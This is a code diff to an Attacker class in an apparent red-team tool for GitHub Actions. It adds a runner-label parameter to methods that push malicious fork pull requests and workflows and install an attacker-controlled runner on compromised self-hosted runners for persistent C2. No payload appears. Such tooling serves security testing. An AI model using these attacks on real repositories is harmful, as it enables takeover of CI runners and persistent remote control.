@@ -262,7 +262,8 @@ class Attacker:
                        custom_workflow: str,
                        commit_message: str,
                        yaml_name: str = "sh_cicd_attack",
-                       workflow_name: str = "Testing"):
+                       workflow_name: str = "Testing",
+                       runner_labels: list = None):
         """Creates a malicious fork pull request against a public repository.
 
         Args:
@@ -360,7 +361,8 @@ class Attacker:
                     yaml_contents = custom_wf.read()
             else:
                 yaml_contents = CICDAttack.create_malicious_yml(
-                    payload, workflow_name=workflow_name
+                    payload, workflow_name=workflow_name,
+                    runner_labels=runner_labels
                 )
 
             commit_hash = cloned_repo.commit_file(
@@ -444,7 +446,8 @@ class Attacker:
             target_branch: str,
             commit_message: str,
             delete_action: bool,
-            yaml_name: str = "sh_cicd_attack"):
+            yaml_name: str = "sh_cicd_attack",
+            runner_labels: list = None):
 
         self.__setup_user_info()
 
@@ -480,7 +483,8 @@ class Attacker:
                     yaml_contents = custom_wf.read()
             else:
                 yaml_contents = CICDAttack.create_push_yml(
-                    payload, branch
+                    payload, branch,
+                    runner_labels=runner_labels
                 )
 
             workflow_id = self.__execute_and_wait_workflow(
@@ -621,7 +625,8 @@ class Attacker:
             target_branch: str,
             commit_message: str,
             delete_action: bool,
-            yaml_name: str = "sh_cicd_attack"):
+            yaml_name: str = "sh_cicd_attack",
+            runner_labels: list = None):
         """Runner-on-Runner attack: installs a GitHub Actions runner on a
         compromised self-hosted runner, registered to an attacker-controlled
         repo for persistent C2 via workflow_dispatch.
@@ -742,7 +747,8 @@ class Attacker:
             return
 
         yaml_contents = CICDAttack.create_ror_yml(
-            reg_token, full_repo_name, runner_version, branch
+            reg_token, full_repo_name, runner_version, branch,
+            runner_labels=runner_labels
         )
 
         Output.info("Pushing runner installation workflow to victim repo...")
